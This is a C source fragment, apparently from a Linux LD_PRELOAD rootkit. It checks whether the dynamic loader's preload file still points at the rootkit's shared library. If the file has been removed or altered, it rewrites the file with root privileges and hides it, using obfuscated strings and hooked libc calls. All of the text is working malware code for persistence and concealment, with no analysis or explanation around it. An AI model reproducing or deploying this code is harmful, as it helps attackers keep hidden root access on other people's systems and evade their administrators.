int ld_noexist(void)
{
    int noexist = 0;
    hook(CACCESS);
    xor(ldpreload, LDSO_PRELOAD);
    if((long)call(CACCESS, ldpreload, F_OK) < 0 && errno == ENOENT)
        noexist = 1;
    clean(ldpreload);
    return noexist;
}

int ld_inconsistent(void)
{
    struct stat ldstat;
    int inconsistent = 0;
    hook(C__XSTAT);
    xor(ldpreload, LDSO_PRELOAD);
    xor(sopath, SOPATH);
    (void)call(C__XSTAT, _STAT_VER, ldpreload, &ldstat);
    if(ldstat.st_size != strlen(sopath) || ld_noexist()) inconsistent = 1;
    clean(ldpreload);
    clean(sopath);
    return inconsistent;
}

void reinstall(void)
{
    if(not_user(0) || !ld_inconsistent()) return;

    FILE *ldfp = xfopen(LDSO_PRELOAD, "w");

    if(ldfp != NULL){
        xfwrite(SOPATH, 1, ldfp);
        (void)fflush(ldfp);
        (void)fclose(ldfp);

        xhide_path(LDSO_PRELOAD);
    }

    return;
}